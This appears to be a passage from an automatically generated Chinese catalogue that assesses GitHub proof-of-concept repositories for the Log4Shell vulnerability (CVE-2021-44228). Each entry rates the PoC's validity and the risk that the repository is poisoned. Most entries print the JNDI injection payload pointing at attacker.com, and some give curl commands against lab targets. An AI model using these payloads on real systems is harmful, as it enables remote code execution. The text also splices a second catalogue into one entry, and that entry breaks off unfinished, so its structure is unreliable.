**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

